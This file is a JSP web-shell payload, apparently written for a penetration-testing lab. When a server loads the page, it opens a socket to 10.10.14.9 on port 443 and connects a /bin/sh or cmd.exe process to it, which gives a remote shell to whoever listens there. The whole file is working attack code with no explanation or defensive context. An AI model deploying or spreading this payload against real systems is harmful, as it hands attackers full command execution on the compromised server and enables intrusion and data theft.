<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream oh;
    OutputStream dh;

    StreamConnector( InputStream oh, OutputStream dh )
    {
      this.oh = oh;
      this.dh = dh;
    }

    public void run()
    {
      BufferedReader lm  = null;
      BufferedWriter pfq = null;
      try
      {
        lm  = new BufferedReader( new InputStreamReader( this.oh ) );
        pfq = new BufferedWriter( new OutputStreamWriter( this.dh ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lm.read( buffer, 0, buffer.length ) ) > 0 )
        {
          pfq.write( buffer, 0, length );
          pfq.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lm != null )
          lm.close();
        if( pfq != null )
          pfq.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.9", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
